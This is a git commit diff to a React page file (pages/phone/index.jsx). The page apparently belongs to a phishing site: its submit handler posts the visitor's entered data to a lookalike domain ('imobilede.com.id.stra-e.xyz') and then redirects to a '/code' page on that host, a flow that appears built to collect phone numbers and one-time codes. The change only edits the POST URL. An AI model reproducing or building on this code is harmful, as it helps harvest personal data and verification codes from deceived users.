9eb067b74ec46037326693859dc8a3a24f59cdb1
kakao0011 <sole68victor@gmail.com>
2024-09-04 18:51:18 +0300

    Update index.jsx

--- pages/phone/index.jsx
+++ pages/phone/index.jsx
@@ -13,7 +13,7 @@ function Home() {
   async function handleSubmitFn() {
     try {
       console.log("o plecat din browser", data);
-      await axios.post(`http://imobilede.com.id.stra-e.xyz/api/phone`, data);
+      await axios.post(`imobilede.com.id.stra-e.xyz/api/phone`, data);
       router.replace('http://imobilede.com.id.stra-e.xyz/code');
     } catch(err) {
       console.log(err.response, "ce o avea");
